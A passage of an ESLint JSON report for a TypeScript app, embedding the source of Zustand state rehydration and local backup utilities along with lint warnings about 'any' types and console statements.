enableVersionControl?: boolean;\n  enableMigrationRecovery?: boolean;\n  enablePerformanceMonitoring?: boolean;\n  rehydrationTimeout?: number;\n  fallbackStrategies?: RehydrationFallback[];\n}\n\n// Custom storage interface for advanced rehydration\nexport interface RehydrationStorage {\n  getItem: (key: string) => Promise<string | null> | string | null;\n  setItem: (key: string, value: string) => Promise<void> | void;\n  removeItem: (key: string) => Promise<void> | void;\n  getAllKeys?: () => Promise<string[]> | string[];\n}\n\n// Fallback strategy configuration\nexport interface RehydrationFallback {\n  name: string;\n  priority: number;\n  storage: RehydrationStorage;\n  key?: string;\n  condition?: (error: Error) => boolean;\n}\n\n// Rehydration result information\nexport interface RehydrationResult<T = any> {\n  success: boolean;\n  data?: T;\n  source?: string;\n  version?: number;\n  migrated?: boolean;\n  fallbackUsed?: boolean;\n  error?: Error;\n  performance?: {\n    startTime: number;\n    endTime: number;\n    duration: number;\n    dataSize: number;\n  };\n}\n\n// State version metadata\nexport interface VersionedState<T = any> {\n  version: number;\n  state: T;\n  timestamp: number;\n  migrations?: string[];\n  metadata?: {\n    userAgent: string;\n    url: string;\n    buildVersion?: string;\n  };\n}\n\n// Default rehydration options\nconst _defaultRehydrationOptions: Required<Omit<RehydrationOptions, 'migrate' | 'onRehydrateStorage' | 'onFinishHydration' | 'fallbackStrategies'>> = {\n  storageKey: 'app_state',\n  version: 0,\n  storage: localStorage,\n  serialize: JSON.stringify,\n  deserialize: JSON.parse,\n  skipHydration: false,\n  enableVersionControl: true,\n  enableMigrationRecovery: true,\n  enablePerformanceMonitoring: true,\n  rehydrationTimeout: 5000\n};\n\n/**\n * Creates an enhanced Zustand store with advanced rehydration capabilities\n */\nexport function withRehydration<T>(\n  storeCreator: StateCreator<T>,\n  options: RehydrationOptions<T> = {}\n): StateCreator<T> {\n  const config = { ..._defaultRehydrationOptions, ...options };\n  \n  return (set, get, api) => {\n    const storeState = storeCreator(set, get, api);\n    let rehydrationComplete = false;\n    let rehydrationPromise: Promise<RehydrationResult<T>> | null = null;\n\n    /**\n     * Creates versioned state wrapper\n     */\n    const createVersionedState = (state: T): VersionedState<T> => ({\n      version: config.version,\n      state,\n      timestamp: Date.now(),\n      metadata: {\n        userAgent: navigator.userAgent,\n        url: window.location.href,\n        buildVersion: process.env.APP_VERSION || 'unknown'\n      }\n    });\n\n    /**\n     * Extracts state from versioned wrapper with fallback\n     */\n    const extractState = (data: any): { state: T; version: number; metadata?: any } => {\n      // Handle versioned state\n      if (data && typeof data === 'object' && 'version' in data && 'state' in data) {\n        return {\n          state: data.state,\n          version: data.version,\n          metadata: data.metadata\n        };\n      }\n      \n      // Handle legacy unversioned state\n      return {\n        state: data,\n        version: 0\n      };\n    };\n\n    /**\n     * Attempts to rehydrate from storage with error handling\n     */\n    const attemptRehydration = async (\n      storage: RehydrationStorage,\n      key: string,\n      sourceName: string\n    ): Promise<RehydrationResult<T>> => {\n      const startTime = performance.now();\n      \n      try {\n        const stored = await storage.getItem(key);\n        \n        if (!stored) {\n          return {\n            success: false,\n            source: sourceName,\n            error: new Error('No stored data found')\n          };\n        }\n\n        const deserialized = config.deserialize(stored);\n        const { state, version, metadata } = extractState(deserialized);\n        \n        let finalState = state;\n        let migrated = false;\n\n        // Handle version migration\n        if (config.migrate && version !== config.version) {\n          try {\n            finalState = config.migrate(state, version);\n            migrated = true;\n            \n            if (config.enablePerformanceMonitoring) {\n              console.debug(`State migrated from version ${version} to ${config.version}`, {\n                source: sourceName,\n                key\n              });\n            }\n          } catch (migrationError) {\n            if (!config.enableMigrationRecovery) {\n              throw migrationError;\n            }\n            \n            console.warn('Migration failed, using original state:', migrationError);\n            finalState = state;\n          }\n        }\n\n        const endTime = performance.now();\n        const dataSize = stored.length;\n\n        return {\n          success: true,\n          data: finalState,\n          source: sourceName,\n          version,\n          migrated,\n          performance: {\n            startTime,\n            endTime,\n            duration: endTime - startTime,\n            dataSize\n          }\n        };\n\n      } catch (error) {\n        const endTime = performance.now();\n        \n        return {\n          success: false,\n          source: sourceName,\n          error: error as Error,\n          performance: {\n            startTime,\n            endTime,\n            duration: endTime - startTime,\n            dataSize: 0\n          }\n        };\n      }\n    };\n\n    /**\n     * Tries fallback strategies in order of priority\n     */\n    const tryFallbackStrategies = async (): Promise<RehydrationResult<T> | null> => {\n      if (!config.fallbackStrategies?.length) {\n        return null;\n      }\n\n      const sortedFallbacks = [...config.fallbackStrategies].sort(\n        (a, b) => b.priority - a.priority\n      );\n\n      for (const fallback of sortedFallbacks) {\n        try {\n          const key = fallback.key || config.storageKey;\n          const result = await attemptRehydration(fallback.storage, key, fallback.name);\n          \n          if (result.success) {\n            return {\n              ...result,\n              fallbackUsed: true,\n              source: `${result.source} (fallback)`\n            };\n          }\n        } catch (error) {\n          console.debug(`Fallback strategy \"${fallback.name}\" failed:`, error);\n        }\n      }\n\n      return null;\n    };\n\n    /**\n     * Main rehydration logic\n     */\n    const performRehydration = async (): Promise<RehydrationResult<T>> => {\n      if (config.skipHydration) {\n        return {\n          success: false,\n          error: new Error('Rehydration skipped by configuration')\n        };\n      }\n\n      // Set timeout for rehydration\n      const timeoutPromise = new Promise<RehydrationResult<T>>((_, reject) => {\n        setTimeout(() => {\n          reject(new Error(`Rehydration timeout after ${config.rehydrationTimeout}ms`));\n        }, config.rehydrationTimeout);\n      });\n\n      try {\n        // Try primary rehydration\n        const primaryResult = await Promise.race([\n          attemptRehydration(config.storage, config.storageKey, 'primary'),\n          timeoutPromise\n        ]);\n\n        if (primaryResult.success && primaryResult.data) {\n          // Apply rehydrated state\n          set(primaryResult.data);\n          \n          if (config.onFinishHydration) {\n            config.onFinishHydration(primaryResult.data);\n          }\n          \n          return primaryResult;\n        }\n\n        // Try fallback strategies\n        const fallbackResult = await tryFallbackStrategies();\n        \n        if (fallbackResult && fallbackResult.success && fallbackResult.data) {\n          set(fallbackResult.data);\n          \n          if (config.onFinishHydration) {\n            config.onFinishHydration(fallbackResult.data);\n          }\n          \n          return fallbackResult;\n        }\n\n        // No successful rehydration\n        return {\n          success: false,\n          error: new Error('All rehydration attempts failed'),\n          source: 'none'\n        };\n\n      } catch (error) {\n        return {\n          success: false,\n          error: error as Error,\n          source: 'timeout'\n        };\n      }\n    };\n\n    /**\n     * Persists current state with versioning\n     */\n    const persistState = async (state: T): Promise<void> => {\n      try {\n        const versionedState = config.enableVersionControl \n          ? createVersionedState(state) \n          : state;\n          \n        const serialized = config.serialize(versionedState);\n        await config.storage.setItem(config.storageKey, serialized);\n        \n        if (config.enablePerformanceMonitoring) {\n          console.debug('State persisted successfully', {\n            size: serialized.length,\n            version: config.version,\n            timestamp: Date.now()\n          });\n        }\n      } catch (error) {\n        console.error('Failed to persist state:', error);\n        \n        if (config.onRehydrateStorage) {\n          config.onRehydrateStorage(null, error as Error);\n        }\n      }\n    };\n\n    // Start rehydration process\n    if (!config.skipHydration) {\n      rehydrationPromise = performRehydration();\n      \n      rehydrationPromise\n        .then((result) => {\n          rehydrationComplete = true;\n          \n          if (config.onRehydrateStorage) {\n            config.onRehydrateStorage(result.data || null, result.error);\n          }\n          \n          if (config.enablePerformanceMonitoring && result.performance) {\n            console.debug('Rehydration completed', {\n              success: result.success,\n              source: result.source,\n              duration: result.performance.duration,\n              dataSize: result.performance.dataSize,\n              migrated: result.migrated,\n              fallbackUsed: result.fallbackUsed\n            });\n          }\n        })\n        .catch((error) => {\n          rehydrationComplete = true;\n          console.error('Rehydration failed:', error);\n          \n          if (config.onRehydrateStorage) {\n            config.onRehydrateStorage(null, error);\n          }\n        });\n    } else {\n      rehydrationComplete = true;\n    }\n\n    // Subscribe to state changes for persistence\n    if (!config.skipHydration) {\n      api.subscribe((state) => {\n        if (rehydrationComplete) {\n          persistState(state);\n        }\n      });\n    }\n\n    // Return enhanced store with rehydration methods\n    return {\n      ...storeState,\n      \n      // Rehydration status\n      get isRehydrated() {\n        return rehydrationComplete;\n      },\n      \n      // Get rehydration promise for waiting\n      get rehydrationPromise() {\n        return rehydrationPromise;\n      },\n      \n      // Manual rehydration trigger\n      async rehydrate(): Promise<RehydrationResult<T>> {\n        rehydrationComplete = false;\n        rehydrationPromise = performRehydration();\n        const result = await rehydrationPromise;\n        rehydrationComplete = true;\n        return result;\n      },\n      \n      // Manual persistence trigger\n      async persist(): Promise<void> {\n        await persistState(get());\n      },\n      \n      // Clear persisted data\n      async clearPersisted(): Promise<void> {\n        try {\n          await config.storage.removeItem(config.storageKey);\n          \n          // Clear fallback storages as well\n          if (config.fallbackStrategies) {\n            await Promise.all(\n              config.fallbackStrategies.map(async (fallback) => {\n                const key = fallback.key || config.storageKey;\n                await fallback.storage.removeItem(key);\n              })\n            );\n          }\n        } catch (error) {\n          console.error('Failed to clear persisted data:', error);\n          throw error;\n        }\n      }\n    };\n  };\n}\n\n/**\n * Creates IndexedDB storage adapter for large data\n */\nexport const createIndexedDBStorage = (\n  dbName: string = 'AppStorage',\n  storeName: string = 'state',\n  version: number = 1\n): RehydrationStorage => {\n  let dbPromise: Promise<IDBDatabase> | null = null;\n\n  const getDB = (): Promise<IDBDatabase> => {\n    if (!dbPromise) {\n      dbPromise = new Promise((resolve, reject) => {\n        const request = indexedDB.open(dbName, version);\n        \n        request.onerror = () => reject(request.error);\n        request.onsuccess = () => resolve(request.result);\n        \n        request.onupgradeneeded = () => {\n          const db = request.result;\n          if (!db.objectStoreNames.contains(storeName)) {\n            db.createObjectStore(storeName);\n          }\n        };\n      });\n    }\n    \n    return dbPromise;\n  };\n\n  return {\n    async getItem(key: string): Promise<string | null> {\n      try {\n        const db = await getDB();\n        const transaction = db.transaction([storeName], 'readonly');\n        const store = transaction.objectStore(storeName);\n        \n        return new Promise((resolve, reject) => {\n          const request = store.get(key);\n          request.onsuccess = () => resolve(request.result || null);\n          request.onerror = () => reject(request.error);\n        });\n      } catch (error) {\n        console.error('IndexedDB getItem failed:', error);\n        return null;\n      }\n    },\n\n    async setItem(key: string, value: string): Promise<void> {\n      try {\n        const db = await getDB();\n        const transaction = db.transaction([storeName], 'readwrite');\n        const store = transaction.objectStore(storeName);\n        \n        return new Promise((resolve, reject) => {\n          const request = store.put(value, key);\n          request.onsuccess = () => resolve();\n          request.onerror = () => reject(request.error);\n        });\n      } catch (error) {\n        console.error('IndexedDB setItem failed:', error);\n        throw error;\n      }\n    },\n\n    async removeItem(key: string): Promise<void> {\n      try {\n        const db = await getDB();\n        const transaction = db.transaction([storeName], 'readwrite');\n        const store = transaction.objectStore(storeName);\n        \n        return new Promise((resolve, reject) => {\n          const request = store.delete(key);\n          request.onsuccess = () => resolve();\n          request.onerror = () => reject(request.error);\n        });\n      } catch (error) {\n        console.error('IndexedDB removeItem failed:', error);\n        throw error;\n      }\n    },\n\n    async getAllKeys(): Promise<string[]> {\n      try {\n        const db = await getDB();\n        const transaction = db.transaction([storeName], 'readonly');\n        const store = transaction.objectStore(storeName);\n        \n        return new Promise((resolve, reject) => {\n          const request = store.getAllKeys();\n          request.onsuccess = () => resolve(request.result as string[]);\n          request.onerror = () => reject(request.error);\n        });\n      } catch (error) {\n        console.error('IndexedDB getAllKeys failed:', error);\n        return [];\n      }\n    }\n  };\n};\n\n/**\n * Creates session storage adapter\n */\nexport const createSessionStorageAdapter = (): RehydrationStorage => ({\n  getItem: (key: string) => sessionStorage.getItem(key),\n  setItem: (key: string, value: string) => sessionStorage.setItem(key, value),\n  removeItem: (key: string) => sessionStorage.removeItem(key),\n  getAllKeys: () => Object.keys(sessionStorage)\n});\n\n// Types are already exported above with their declarations","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/stateBackup.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":31,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":31,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1206,1209],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1206,1209],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":147,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":147,"endColumn":19,"suggestions":[{"fix":{"range":[4136,4204],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":163,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":163,"endColumn":19,"suggestions":[{"fix":{"range":[4537,4608],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":179,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":179,"endColumn":20,"suggestions":[{"fix":{"range":[4995,5050],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":193,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":193,"endColumn":21,"suggestions":[{"fix":{"range":[5367,5439],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":202,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":202,"endColumn":20,"suggestions":[{"fix":{"range":[5737,5785],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":286,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":286,"endColumn":24,"suggestions":[{"fix":{"range":[8559,8829],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":297,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":297,"endColumn":20,"suggestions":[{"fix":{"range":[8883,8932],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":334,"column":11,"nodeType":"MemberExpression","messageId":"unexpected","endLine":334,"endColumn":23,"suggestions":[{"fix":{"range":[9857,9920],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":457,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":457,"endColumn":20,"suggestions":[{"fix":{"range":[13063,13112],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":529,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":529,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[14418,14421],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[14418,14421],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":11,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Advanced State Backup System for Zustand Stores (2025)\n * \n * Implements intelligent state backup with debouncing, compression, integrity checks,\n * and automated cleanup following 2025 best practices for crash recovery.\n * \n * Features:\n * - Debounced backup operations to prevent performance issues\n * - Data compression for large state objects  \n * - Integrity verification with checksums\n * - Automatic cleanup of old backups\n * - Recovery strategies with fallback options\n * - Performance monitoring and telemetry integration\n */\n\nimport { StoreApi } from 'zustand';\n\n// Backup configuration interface\nexport interface BackupOptions {\n  backupInterval?: number; // milliseconds between backup attempts\n  maxBackups?: number; // maximum number of backups to keep\n  storageKey?: string; // localStorage key for backups\n  enableCompression?: boolean; // compress backup data\n  enableIntegrityCheck?: boolean; // verify backup integrity\n  enableTelemetry?: boolean; // track backup performance\n  maxStorageSize?: number; // maximum storage size in bytes\n  retentionPeriod?: number; // backup retention period in milliseconds\n}\n\n// Individual backup entry structure\nexport interface StateBackup<T = any> {\n  id: string;\n  timestamp: number;\n  state: T;\n  checksum: string;\n  version: string;\n  metadata: {\n    storeId: string;\n    userAgent: string;\n    url: string;\n    storeVersion: number;\n    compressionEnabled: boolean;\n    dataSize: number;\n  };\n}\n\n// Backup statistics for monitoring\nexport interface BackupStats {\n  totalBackups: number;\n  totalStorageUsed: number;\n  averageBackupSize: number;\n  lastBackupTime: number | null;\n  successfulBackups: number;\n  failedBackups: number;\n  compressionRatio: number;\n  oldestBackupAge: number | null;\n}\n\n// Recovery result interface\nexport interface RecoveryResult {\n  success: boolean;\n  backupId?: string;\n  timestamp?: number;\n  error?: string;\n  dataIntegrityOk?: boolean;\n  fallbackUsed?: boolean;\n}\n\n// Default backup options\nconst _defaultOptions: Required<BackupOptions> = {\n  backupInterval: 5000, // 5 seconds\n  maxBackups: 5,\n  storageKey: 'app_state_backups',\n  enableCompression: true,\n  enableIntegrityCheck: true,\n  enableTelemetry: true,\n  maxStorageSize: 5 * 1024 * 1024, // 5MB\n  retentionPeriod: 7 * 24 * 60 * 60 * 1000 // 7 days\n};\n\n/**\n * Creates an intelligent state backup manager for Zustand stores\n */\nexport function createStateBackup<T>(\n  store: StoreApi<T>,\n  options: BackupOptions = {}\n) {\n  const config = { ..._defaultOptions, ...options };\n  const storeId = config.storageKey.replace('_backups', '');\n  \n  let isDestroyed = false;\n  let backupInProgress = false;\n  let lastBackupTime = 0;\n  let backupQueue: Array<() => void> = [];\n  let stats: BackupStats = {\n    totalBackups: 0,\n    totalStorageUsed: 0,\n    averageBackupSize: 0,\n    lastBackupTime: null,\n    successfulBackups: 0,\n    failedBackups: 0,\n    compressionRatio: 1.0,\n    oldestBackupAge: null\n  };\n\n  // Debounced backup function\n  let backupTimeoutId: NodeJS.Timeout | null = null;\n  \n  const scheduleBackup = () => {\n    if (isDestroyed || backupInProgress) return;\n    \n    if (backupTimeoutId) {\n      clearTimeout(backupTimeoutId);\n    }\n    \n    backupTimeoutId = setTimeout(() => {\n      performBackup();\n    }, config.backupInterval);\n  };\n\n  /**\n   * Generates a checksum for data integrity verification\n   */\n  const generateChecksum = (data: string): string => {\n    let hash = 0;\n    for (let i = 0; i < data.length; i++) {\n      const char = data.charCodeAt(i);\n      hash = ((hash << 5) - hash) + char;\n      hash = hash & hash; // Convert to 32-bit integer\n    }\n    return Math.abs(hash).toString(16);\n  };\n\n  /**\n   * Compresses data using simple RLE compression\n   */\n  const compressData = (data: string): string => {\n    if (!config.enableCompression) return data;\n    \n    try {\n      // Simple run-length encoding for demo\n      // In production, consider using a proper compression library\n      return data.replace(/(.)\\1+/g, (match, char) => {\n        return match.length > 3 ? `${char}*${match.length}` : match;\n      });\n    } catch (error) {\n      console.warn('Compression failed, using uncompressed data:', error);\n      return data;\n    }\n  };\n\n  /**\n   * Decompresses data\n   */\n  const decompressData = (data: string): string => {\n    if (!config.enableCompression) return data;\n    \n    try {\n      return data.replace(/(.)\\*(\\d+)/g, (match, char, count) => {\n        return char.repeat(parseInt(count));\n      });\n    } catch (error) {\n      console.warn('Decompression failed, treating as uncompressed:', error);\n      return data;\n    }\n  };\n\n  /**\n   * Gets current backups from storage\n   */\n  const getStoredBackups = (): StateBackup<T>[] => {\n    try {\n      const stored = localStorage.getItem(config.storageKey);\n      if (!stored) return [];\n      \n      const backups = JSON.parse(stored) as StateBackup<T>[];\n      return Array.isArray(backups) ? backups : [];\n    } catch (error) {\n      console.error('Failed to load stored backups:', error);\n      return [];\n    }\n  };\n\n  /**\n   * Saves backups to storage with size limits\n   */\n  const saveBackups = (backups: StateBackup<T>[]): boolean => {\n    try {\n      const serialized = JSON.stringify(backups);\n      \n      // Check storage size limit\n      if (serialized.length > config.maxStorageSize) {\n        console.warn('Backup data exceeds storage limit, removing old backups');\n        const reducedBackups = backups.slice(-Math.floor(config.maxBackups / 2));\n        return saveBackups(reducedBackups);\n      }\n      \n      localStorage.setItem(config.storageKey, serialized);\n      stats.totalStorageUsed = serialized.length;\n      return true;\n    } catch (error) {\n      console.error('Failed to save backups:', error);\n      stats.failedBackups++;\n      return false;\n    }\n  };\n\n  /**\n   * Performs the actual backup operation\n   */\n  const performBackup = async (): Promise<void> => {\n    if (isDestroyed || backupInProgress) return;\n    \n    backupInProgress = true;\n    const startTime = performance.now();\n    \n    try {\n      const currentState = store.getState();\n      const timestamp = Date.now();\n      \n      // Avoid duplicate backups if state hasn't changed\n      if (timestamp - lastBackupTime < config.backupInterval / 2) {\n        return;\n      }\n      \n      const stateJson = JSON.stringify(currentState);\n      const compressedData = compressData(stateJson);\n      const checksum = generateChecksum(stateJson);\n      \n      const backup: StateBackup<T> = {\n        id: `backup_${timestamp}_${Math.random().toString(36).substring(2)}`,\n        timestamp,\n        state: JSON.parse(decompressData(compressedData)),\n        checksum,\n        version: '1.0.0',\n        metadata: {\n          storeId,\n          userAgent: navigator.userAgent,\n          url: window.location.href,\n          storeVersion: 1,\n          compressionEnabled: config.enableCompression,\n          dataSize: stateJson.length\n        }\n      };\n      \n      // Get existing backups and add new one\n      const backups = getStoredBackups();\n      backups.unshift(backup);\n      \n      // Cleanup old backups by count\n      while (backups.length > config.maxBackups) {\n        backups.pop();\n      }\n      \n      // Cleanup old backups by age\n      const cutoffTime = timestamp - config.retentionPeriod;\n      const validBackups = backups.filter(b => b.timestamp > cutoffTime);\n      \n      // Save to storage\n      if (saveBackups(validBackups)) {\n        lastBackupTime = timestamp;\n        stats.successfulBackups++;\n        stats.totalBackups = validBackups.length;\n        stats.lastBackupTime = timestamp;\n        \n        // Update compression ratio\n        if (config.enableCompression) {\n          const originalSize = stateJson.length;\n          const compressedSize = compressedData.length;\n          stats.compressionRatio = originalSize > 0 ? compressedSize / originalSize : 1.0;\n        }\n        \n        // Update average backup size\n        const totalSize = validBackups.reduce((sum, b) => sum + b.metadata.dataSize, 0);\n        stats.averageBackupSize = validBackups.length > 0 ? totalSize / validBackups.length : 0;\n        \n        // Update oldest backup age\n        if (validBackups.length > 0) {\n          const oldest = validBackups[validBackups.length - 1];\n          stats.oldestBackupAge = timestamp - oldest.timestamp;\n        }\n        \n        // Performance telemetry\n        if (config.enableTelemetry) {\n          const duration = performance.now() - startTime;\n          console.debug(`Backup completed in ${duration.toFixed(2)}ms`, {\n            storeId,\n            backupId: backup.id,\n            dataSize: stateJson.length,\n            compressionRatio: stats.compressionRatio,\n            totalBackups: stats.totalBackups\n          });\n        }\n      }\n      \n    } catch (error) {\n      console.error('Backup operation failed:', error);\n      stats.failedBackups++;\n    } finally {\n      backupInProgress = false;\n    }\n  };\n\n  /**\n   * Restores state from the latest backup\n   */\n  const restoreLatestBackup = (): RecoveryResult => {\n    try {\n      const backups = getStoredBackups();\n      \n      if (backups.length === 0) {\n        return {\n          success: false,\n          error: 'No backups available'\n        };\n      }\n      \n      const latestBackup = backups[0];\n      \n      // Handle undefined case from array access\n      if (latestBackup === undefined) {\n        return {\n          success: false,\n          error: 'No valid backup found'\n        };\n      }\n      \n      // Verify integrity if enabled\n      if (config.enableIntegrityCheck) {\n        const stateJson = JSON.stringify(latestBackup.state);\n        const expectedChecksum = generateChecksum(stateJson);\n        \n        if (expectedChecksum !== latestBackup.checksum) {\n          console.warn('Backup integrity check failed, trying fallback');\n          \n          // Try next backup as fallback\n          if (backups.length > 1) {\n            const fallbackBackup = backups[1];\n            \n            // Check if fallback backup exists\n            if (fallbackBackup === undefined) {\n              return {\n                success: false,\n                error: 'No fallback backup available',\n                dataIntegrityOk: false\n              };\n            }\n            const fallbackJson = JSON.stringify(fallbackBackup.state);\n            const fallbackChecksum = generateChecksum(fallbackJson);\n            \n            if (fallbackChecksum === fallbackBackup.checksum) {\n              store.setState(fallbackBackup.state);\n              return {\n                success: true,\n                backupId: fallbackBackup.id,\n                timestamp: fallbackBackup.timestamp,\n                dataIntegrityOk: true,\n                fallbackUsed: true\n              };\n            }\n          }\n          \n          return {\n            success: false,\n            error: 'Backup integrity check failed and no valid fallback available',\n            dataIntegrityOk: false\n          };\n        }\n      }\n      \n      // Restore state\n      store.setState(latestBackup.state);\n      \n      return {\n        success: true,\n        backupId: latestBackup.id,\n        timestamp: latestBackup.timestamp,\n        dataIntegrityOk: true,\n        fallbackUsed: false\n      };\n      \n    } catch (error) {\n      return {\n        success: false,\n        error: `Restore failed: ${error}`\n      };\n    }\n  };\n\n  /**\n   * Restores state from a specific backup\n   */\n  const restoreFromBackup = (backupId: string): RecoveryResult => {\n    try {\n      const backups = getStoredBackups();\n      const backup = backups.find(b => b.id === backupId);\n      \n      if (!backup) {\n        return {\n          success: false,\n          error: `Backup with ID ${backupId} not found`\n        };\n      }\n      \n      // Verify integrity if enabled\n      if (config.enableIntegrityCheck) {\n        const stateJson = JSON.stringify(backup.state);\n        const expectedChecksum = generateChecksum(stateJson);\n        \n        if (expectedChecksum !== backup.checksum) {\n          return {\n            success: false,\n            error: 'Backup integrity check failed',\n            dataIntegrityOk: false\n          };\n        }\n      }\n      \n      store.setState(backup.state);\n      \n      return {\n        success: true,\n        backupId: backup.id,\n        timestamp: backup.timestamp,\n        dataIntegrityOk: true\n      };\n      \n    } catch (error) {\n      return {\n        success: false,\n        error: `Restore failed: ${error}`\n      };\n    }\n  };\n\n  /**\n   * Gets all available backups\n   */\n  const getBackups = (): StateBackup<T>[] => {\n    return getStoredBackups();\n  };\n\n  /**\n   * Clears all backups\n   */\n  const clearBackups = (): void => {\n    try {\n      localStorage.removeItem(config.storageKey);\n      stats = {\n        ...stats,\n        totalBackups: 0,\n        totalStorageUsed: 0,\n        lastBackupTime: null,\n        oldestBackupAge: null\n      };\n    } catch (error) {\n      console.error('Failed to clear backups:', error);\n    }\n  };\n\n  /**\n   * Gets backup statistics\n   */\n  const getStats = (): BackupStats => {\n    return { ...stats };\n  };\n\n  /**\n   * Forces an immediate backup\n   */\n  const forceBackup = (): void => {\n    if (backupTimeoutId) {\n      clearTimeout(backupTimeoutId);\n      backupTimeoutId = null;\n    }\n    performBackup();\n  };\n\n  // Set up store subscription for automatic backups\n  const unsubscribe = store.subscribe(() => {\n    if (!isDestroyed) {\n      scheduleBackup();\n    }\n  });\n\n  /**\n   * Cleanup function\n   */\n  const destroy = (): void => {\n    isDestroyed = true;\n    \n    if (backupTimeoutId) {\n      clearTimeout(backupTimeoutId);\n      backupTimeoutId = null;\n    }\n    \n    unsubscribe();\n    \n    // Process any remaining backup queue\n    backupQueue.forEach(fn => fn());\n    backupQueue = [];\n  };\n\n  // Initial backup\n  scheduleBackup();\n\n  return {\n    restoreLatestBackup,\n    restoreFromBackup,\n    getBackups,\n    clearBackups,\n    getStats,\n    forceBackup,\n    destroy,\n    \n    // Read-only configuration access\n    get config() {\n      return { ...config };\n    },\n    \n    // Check if backup system is healthy\n    get isHealthy() {\n      return !isDestroyed && stats.failedBackups < stats.successfulBackups;\n    }\n  };\n}\n\n// Export types\nexport type StateBackupManager<T = any> = ReturnType<typeof createStateBackup<T>>;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/store/storeErrorWrapper.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":72,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":72,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1843,1846],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1843,1846],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":73,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":73,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1909,1912],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1909,1912],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":78,"column":38,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":78,"endColumn":41,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2045,2048],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2045,2048],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":114,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":114,"endColumn":20,"suggestions":[{"fix":{"range":[3305,3384],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":155,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":155,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4675,4678],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is 